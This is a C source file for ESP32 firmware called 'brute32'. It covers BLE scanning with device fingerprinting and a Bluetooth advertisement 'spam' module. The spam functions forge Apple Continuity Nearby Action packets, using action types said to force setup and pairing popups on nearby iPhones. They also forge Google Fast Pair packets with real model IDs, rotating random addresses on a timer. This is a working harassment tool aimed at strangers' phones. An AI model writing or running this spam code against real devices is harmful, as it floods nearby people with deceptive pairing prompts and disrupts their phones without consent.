/**
 * @file ble_controller.c
 * @brief NimBLE bring-up, passive GAP scanning with fingerprinting, and
 * advertising-layer spam.
 *
 * Spam payload bytes for the Apple Continuity "Nearby Action" message
 * (type 0x10) and the Google Fast Pair service-data record follow the
 * publicly documented AD structure for each protocol, but the specific
 * action-type/model-ID values that make a given phone show a specific
 * popup are best-effort from public write-ups, not from Apple/Google specs
 * — like PMKID capture before hardware-testing found a supporting target,
 * treat this as mechanically-correct-but-unproven until confirmed against
 * a real device (see DEVLOG.md).
 */
#include "ble_controller.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "esp_random.h"
#include "esp_timer.h"

#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/ble_hs_id.h"
#include "host/util/util.h"
#include "services/gap/ble_svc_gap.h"

static const char *TAG = "ble_controller";

static ble_device_t devices[CONFIG_BLE_MAX_DEVICES];
static unsigned device_count = 0;
static bool scanning = false;
static bool host_synced = false;

static esp_timer_handle_t spam_timer = NULL;
static ble_spam_mode_t spam_mode;
static bool spam_running = false;

// --- host bring-up ---

static void on_reset(int reason) {
    ESP_LOGW(TAG, "NimBLE host reset, reason=%d", reason);
}

static void on_sync(void) {
    ble_hs_util_ensure_addr(0);
    host_synced = true;
    ESP_LOGI(TAG, "NimBLE host synced");
}

static void host_task(void *param) {
    nimble_port_run();
    nimble_port_freertos_deinit();
}

void ble_controller_init(void) {
    static bool initialized = false;
    if (initialized) {
        return;
    }

    ESP_ERROR_CHECK(nimble_port_init());

    ble_hs_cfg.reset_cb = on_reset;
    ble_hs_cfg.sync_cb = on_sync;

    ble_svc_gap_device_name_set("brute32");

    nimble_port_freertos_init(host_task);
    initialized = true;
}

// --- scanning ---

static ble_device_t *find_or_add_device(const ble_addr_t *addr) {
    for (unsigned i = 0; i < device_count; i++) {
        if (memcmp(devices[i].addr, addr->val, 6) == 0) {
            return &devices[i];
        }
    }
    if (device_count >= CONFIG_BLE_MAX_DEVICES) {
        return NULL;
    }
    ble_device_t *dev = &devices[device_count++];
    memset(dev, 0, sizeof(*dev));
    memcpy(dev->addr, addr->val, 6);
    dev->addr_type = addr->type;
    dev->company_id = 0xFFFF;
    return dev;
}

static int gap_event_handler(struct ble_gap_event *event, void *arg) {
    if (event->type != BLE_GAP_EVENT_DISC) {
        if (event->type == BLE_GAP_EVENT_DISC_COMPLETE) {
            scanning = false;
        }
        return 0;
    }

    struct ble_hs_adv_fields fields;
    if (ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data) != 0) {
        return 0;
    }

    ble_device_t *dev = find_or_add_device(&event->disc.addr);
    if (dev == NULL) {
        return 0;
    }

    dev->rssi = event->disc.rssi;
    dev->connectable = (event->disc.event_type == BLE_HCI_ADV_RPT_EVTYPE_ADV_IND) ||
                        (event->disc.event_type == BLE_HCI_ADV_RPT_EVTYPE_DIR_IND);

    if (fields.name != NULL && fields.name_len > 0) {
        uint8_t len = fields.name_len < sizeof(dev->name) - 1 ? fields.name_len : sizeof(dev->name) - 1;
        memcpy(dev->name, fields.name, len);
        dev->name[len] = '\0';
        dev->name_len = len;
    }

    if (fields.mfg_data != NULL && fields.mfg_data_len >= 2) {
        dev->company_id = fields.mfg_data[0] | (fields.mfg_data[1] << 8);
        uint8_t len = fields.mfg_data_len < sizeof(dev->mfg_data) ? fields.mfg_data_len : sizeof(dev->mfg_data);
        memcpy(dev->mfg_data, fields.mfg_data, len);
        dev->mfg_data_len = len;
    }

    return 0;
}

void ble_controller_scan_start(unsigned duration_sec) {
    if (!host_synced) {
        ESP_LOGW(TAG, "Host not synced yet; try again shortly.");
        return;
    }

    uint8_t own_addr_type;
    if (ble_hs_id_infer_auto(0, &own_addr_type) != 0) {
        ESP_LOGE(TAG, "Failed to infer own address type");
        return;
    }

    struct ble_gap_disc_params disc_params = {
        .filter_duplicates = 0, // we dedup ourselves so RSSI/fields keep updating
        .passive = 0,           // active scan: also captures scan-response fields (e.g. name)
        .itvl = 0,
        .window = 0,
        .filter_policy = 0,
        .limited = 0,
    };

    int32_t duration_ms = duration_sec == 0 ? BLE_HS_FOREVER : (int32_t) duration_sec * 1000;
    int rc = ble_gap_disc(own_addr_type, duration_ms, &disc_params, gap_event_handler, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_disc failed, rc=%d", rc);
        return;
    }
    scanning = true;
}

void ble_controller_scan_stop(void) {
    if (scanning) {
        ble_gap_disc_cancel();
        scanning = false;
    }
}

bool ble_controller_scan_is_running(void) {
    return scanning;
}

unsigned ble_controller_get_devices(ble_device_t *out, unsigned max) {
    unsigned n = device_count < max ? device_count : max;
    memcpy(out, devices, n * sizeof(ble_device_t));
    return n;
}

void ble_controller_clear_devices(void) {
    device_count = 0;
}

// --- spam ---

// Publicly documented Apple Continuity "Nearby Action" action-type bytes
// that are known to trigger a full-screen popup on nearby iOS devices.
static const uint8_t apple_action_types[] = {
    0x01, // Apple TV Setup
    0x06, // Setup New Device
    0x09, // HomePod Setup
    0x0B, // Join This AppleID
    0x13, // Pair (AirPods-style "Would you like to pair" sheet)
    0x1E, // Apple TV Pair
    0x20, // Setup New AppleTV
};

// Fast Pair "not discoverable" advertisement is just the 3-byte model ID as
// service data under UUID 0xFE2C; these are a handful of real, publicly
// registered model IDs pulled from open BLE-spam references.
static const uint8_t fastpair_model_ids[][3] = {
    {0x00, 0x00, 0xC3},
    {0x82, 0x92, 0x06},
    {0x71, 0xF1, 0x38},
};

static void randomize_adv_address(void) {
    ble_addr_t addr;
    if (ble_hs_id_gen_rnd(1, &addr) == 0) {
        ble_hs_id_set_rnd(addr.val);
    }
}

static int build_apple_payload(uint8_t *buf) {
    uint8_t action = apple_action_types[esp_random() % (sizeof(apple_action_types) / sizeof(apple_action_types[0]))];
    uint8_t len = 0;

    buf[len++] = 0x02; buf[len++] = 0x01; buf[len++] = 0x06; // flags: LE general discoverable, no BR/EDR

    uint8_t mfg_payload[] = {
        0x4C, 0x00,             // Apple company ID (LE)
        0x10, 0x05,             // Continuity type 0x10 (Nearby Action), length 5
        0x00,                   // action flags
        action,                 // action type -> determines which popup shows
        (uint8_t) esp_random(), (uint8_t) esp_random(), (uint8_t) esp_random(), // auth tag (opaque)
    };
    buf[len++] = sizeof(mfg_payload) + 1;
    buf[len++] = 0xFF; // AD type: Manufacturer Specific Data
    memcpy(&buf[len], mfg_payload, sizeof(mfg_payload));
    len += sizeof(mfg_payload);

    return len;
}

static int build_android_payload(uint8_t *buf) {
    const uint8_t *model_id = fastpair_model_ids[esp_random() % (sizeof(fastpair_model_ids) / sizeof(fastpair_model_ids[0]))];
    uint8_t len = 0;

    buf[len++] = 0x02; buf[len++] = 0x01; buf[len++] = 0x06;

    uint8_t svc_payload[] = {
        0x2C, 0xFE, // Fast Pair service UUID 0xFE2C (LE)
        model_id[0], model_id[1], model_id[2],
    };
    buf[len++] = sizeof(svc_payload) + 1;
    buf[len++] = 0x16; // AD type: Service Data - 16-bit UUID
    memcpy(&buf[len], svc_payload, sizeof(svc_payload));
    len += sizeof(svc_payload);

    return len;
}

static void spam_tick(void *arg) {
    ble_gap_adv_stop();
    randomize_adv_address();

    uint8_t payload[31];
    ble_spam_mode_t use_mode = spam_mode;
    if (spam_mode == BLE_SPAM_ALL) {
        use_mode = (esp_random() & 1) ? BLE_SPAM_APPLE : BLE_SPAM_ANDROID;
    }
    int len = (use_mode == BLE_SPAM_APPLE) ? build_apple_payload(payload) : build_android_payload(payload);

    if (ble_gap_adv_set_data(payload, len) != 0) {
        ESP_LOGW(TAG, "Failed to set spam adv data");
        return;
    }

    struct ble_gap_adv_params adv_params = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = 0,
        .itvl_max = 0,
    };
    int rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &adv_params, NULL, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "ble_gap_adv_start failed, rc=%d", rc);
    }
}

void ble_controller_spam_start(ble_spam_mode_t mode, unsigned interval_ms) {
    if (!host_synced) {
        ESP_LOGW(TAG, "Host not synced yet; try again shortly.");
        return;
    }
    if (spam_running) {
        return;
    }

    spam_mode = mode;
    if (spam_timer == NULL) {
        const esp_timer_create_args_t timer_args = {
            .callback = &spam_tick,
            .name = "ble_spam",
        };
        ESP_ERROR_CHECK(esp_timer_create(&timer_args, &spam_timer));
    }

    spam_running = true;
    spam_tick(NULL);
    ESP_ERROR_CHECK(esp_timer_start_periodic(spam_timer, (uint64_t) interval_ms * 1000));
}

void ble_controller_spam_stop(void) {
    if (!spam_running) {
        return;
    }
    esp_timer_stop(spam_timer);
    ble_gap_adv_stop();
    spam_running = false;
}

bool ble_controller_spam_is_running(void) {
    return spam_running;
}
